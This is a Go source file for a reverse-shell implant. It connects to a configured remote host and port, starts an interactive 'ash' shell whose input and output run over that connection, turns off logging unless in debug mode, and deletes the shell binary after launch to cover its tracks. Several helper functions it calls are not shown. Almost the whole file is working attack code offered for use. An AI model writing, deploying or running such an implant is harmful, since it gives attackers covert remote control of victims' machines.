package main

import (
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"path"
)

func main() {
	config := readConfig()
	startReverseShell(config)
}

func startReverseShell(config Config) {
	if !config.Debug {
		disableLogging()
	}

	host := fmt.Sprintf("%s:%d", config.Addr, config.Port)
	conn, err := net.Dial(config.Protocol, host)
	check(err)

	shellpath := path.Join(config.Path, "ash")
	stdin := startShell(shellpath, conn)
	reader := newNetLineReader(conn, config.Timeout)

	// feed input from network until timeout value exceeds or
	// EOF is met.
	for {
		line, err := reader.Readline()
		check(err)

		_, err = stdin.Write(line)
		check(err)
	}
}

func startShell(shellpath string, conn net.Conn) io.WriteCloser {
	loadShell(shellpath)

	shell := exec.Command(shellpath, "-i")
	shell.Stdout = conn
	shell.Stderr = conn

	stdin, err := shell.StdinPipe()
	check(err)

	check(shell.Start())

	check(os.RemoveAll(shellpath))

	return stdin
}
